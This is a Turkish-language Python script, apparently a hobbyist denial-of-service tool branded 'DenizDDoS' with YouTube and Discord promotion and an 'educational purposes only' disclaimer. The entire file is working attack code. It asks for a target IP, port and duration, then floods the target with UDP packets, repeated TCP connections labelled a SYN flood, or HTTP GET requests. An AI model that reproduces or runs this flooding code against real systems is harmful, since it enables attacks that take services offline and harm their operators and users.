from termcolor import colored
import sys
import os
import time
import socket

# Terminali temizle
os.system("clear")
os.system("figlet DenizDDoS")

print()
print(colored("https://www.youtube.com/@denizzqq4", 'cyan'))
print(colored("Discord: denizzqq4", 'magenta'))
print(colored("Davet : https://discord.gg/denizzqq", 'green'))
print(colored("DenizDDoS - Sürüm: 1.0", 'yellow'))
print(colored("Saldırı en iyi savunmadır!", 'red'))
print(colored("Sadece eğitim amaçlıdır. Sorumluluk kabul edilmez.", 'cyan'))
print()

# Hedef IP ve port al
ip = input("Hedef IP girin: ")
try:
    port = int(input("Hedef port girin: "))
except ValueError:
    print(colored("Geçersiz port. Çıkılıyor...", "red"))
    sys.exit()

# Saldırı süresi al
try:
    süre = int(input("Saldırı süresini saniye cinsinden girin: "))
except ValueError:
    print(colored("Geçersiz süre. Çıkılıyor...", "red"))
    sys.exit()

# UDP Flood Fonksiyonu
def udp_flood(ip, port, mesaj, süre):
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(süre)
    hedef = (ip, port)
    baslangic = time.time()
    paket_sayisi = 0
    while True:
        try:
            s.sendto(mesaj, hedef)
            paket_sayisi += 1
            print(f"Paket gönderildi: {paket_sayisi}")
        except socket.error:
            break
        if time.time() - baslangic >= süre:
            break
    s.close()

# SYN Flood Fonksiyonu
def syn_flood(ip, port, süre):
    gonderilen = 0
    bitis_zamani = time.time() + süre
    while True:
        try:
            if time.time() > bitis_zamani:
                break
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            gonderilen += 1
            print(f"SYN paketi gönderildi: {gonderilen} → {ip}")
            sock.close()
        except OSError:
            pass
        except KeyboardInterrupt:
            print(colored("\n[*] Saldırı kullanıcı tarafından durduruldu.", "yellow"))
            sys.exit()
        finally:
            try:
                sock.close()
            except:
                pass

# HTTP Flood Fonksiyonu
def http_flood(ip, port, süre):
    istek = b"GET / HTTP/1.1\r\nHost: hedef.com\r\n\r\n"
    gonderilen = 0
    bitis_zamani = time.time() + süre
    while True:
        try:
            if time.time() > bitis_zamani:
                break
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            sock.sendall(istek)
            gonderilen += 1
            print(f"HTTP isteği gönderildi: {gonderilen} → {ip}")
        except KeyboardInterrupt:
            print(colored("\n[-] Saldırı kullanıcı tarafından durduruldu.", "yellow"))
            break
        except:
            pass
        finally:
            try:
                sock.close()
            except:
                pass

# Saldırı türü seçimi
print(colored("\nSaldırı türünü seçin:", "green"))
print(colored("1. UDP Flood", "cyan"))
print(colored("2. HTTP Flood", "cyan"))
print(colored("3. SYN Flood", "cyan"))
secim = input(colored("Seçiminiz (1/2/3): ", "green"))

if secim == "1":
    mesaj = b"1337 paket yollanıyo bebeğim"
    print(colored("UDP saldırısı başlatılıyor...", "red"))
    udp_flood(ip, port, mesaj, süre)
    print(colored("UDP saldırısı tamamlandı!", "red"))
elif secim == "2":
    print(colored("HTTP saldırısı başlatılıyor...", "red"))
    http_flood(ip, port, süre)
    print(colored("HTTP saldırısı tamamlandı!", "red"))
elif secim == "3":
    print(colored("SYN saldırısı başlatılıyor...", "red"))
    syn_flood(ip, port, süre)
    print(colored("SYN saldırısı tamamlandı!", "red"))
else:
    print(colored("Geçersiz seçim. Çıkılıyor...", "red"))
    sys.exit()
